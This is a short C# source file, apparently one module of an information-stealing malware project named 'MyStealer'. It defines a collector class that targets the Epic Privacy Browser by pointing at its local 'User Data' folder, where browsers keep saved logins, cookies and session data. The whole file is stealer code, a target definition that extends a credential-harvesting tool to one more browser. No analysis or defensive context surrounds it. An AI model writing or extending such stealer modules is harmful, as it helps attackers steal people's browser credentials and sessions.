using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class EpicPrivacyBrowser : Chromium
    {
        public override string ModuleName => "Epic Privacy Browser";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Epic Privacy Browser", "User Data");
    }
}
